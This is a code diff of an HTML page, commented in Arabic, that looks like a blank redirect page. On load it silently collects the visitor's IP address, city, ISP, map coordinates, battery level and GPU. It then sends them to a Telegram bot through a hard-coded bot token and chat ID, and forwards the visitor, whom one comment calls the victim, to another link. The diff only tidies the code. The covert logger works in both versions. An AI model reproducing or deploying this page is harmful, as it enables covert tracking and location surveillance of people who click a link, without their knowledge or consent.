@@ -2,33 +2,29 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Redirecting...</title>
     <script>
         async function capture() {
-            // معلوماتك الثابتة
+            // معلوماتك اللي ما تتغير
             const token = "8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8";
             const chat_id = "5773364548";
-            const urlParams = new URLSearchParams(window.location.search);
-            const target = urlParams.get('u') || "https://t.me/vo11a";
+            const p = new URLSearchParams(window.location.search);
+            const target = p.get('u') || "https://t.me/vo11a";
 
-            // 1. جلب البطارية والـ GPU
-            let batt = "N/A";
-            try { const b = await navigator.getBattery(); batt = Math.round(b.level * 100) + "%"; } catch(e) {}
+            // 1. جلب البطارية
+            let b = "N/A"; try { const bt = await navigator.getBattery(); b = Math.round(bt.level*100)+"%"; } catch(e){}
             
+            // 2. جلب الـ GPU
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl');
-            const debug = gl.getExtension('WEBGL_debug_renderer_info');
-            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : "null";
+            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+            const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "null";
 
-            // 2. جلب الموقع والآيبي
-            let d = {ip: "N/A", city: "N/A", region: "N/A", org: "N/A", lat: 0, lon: 0};
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                d = await res.json();
-            } catch(e) {}
+            // 3. جلب الموقع والآيبي (تلقائي)
+            let d = {ip:"N/A", city:"N/A", region:"N/A", org:"N/A", lat:0, lon:0};
+            try { const r = await fetch('https://ipapi.co/json/'); d = await r.json(); } catch(e){}
 
-            // 3. التنسيق اللي طلبته بالضبط (الرصد الاحترافي)
-            const report = `🚀 رصد احترافي - تحليل المواصفات 🚀
+            // 4. التنسيق اللي ردته (الرصد الاحترافي)
+            const msg = `🚀 رصد احترافي - تحليل المواصفات 🚀
 ━━━━━━━━━━━━━━━
 🌐 الآيبي الخارجي:
 ${d.ip}
@@ -43,20 +39,20 @@ ${gpu}
 
 🏢 الشركة: ${d.org}
 
-🔋 البطارية: ${batt}
+🔋 البطارية: ${b}
 
 🗺️ رابط الخريطة:
-http://maps.google.com/maps?q=${d.latitude},${d.longitude}
+https://www.google.com/maps?q=${d.latitude},${d.longitude}
 ━━━━━━━━━━━━━━━`;
 
-            // 4. إرسال البيانات للتليجرام
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(report)}`);
+            // 5. إرسال المعلومات للبوت
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
 
-            // 5. التحويل للرابط النهائي
+            // 6. التحويل التلقائي للضحية
             window.location.replace(target);
         }
         window.onload = capture;
     </script>
 </head>
-<body style="background: black;"></body>
+<body style="background:#000;"></body>
 </html>
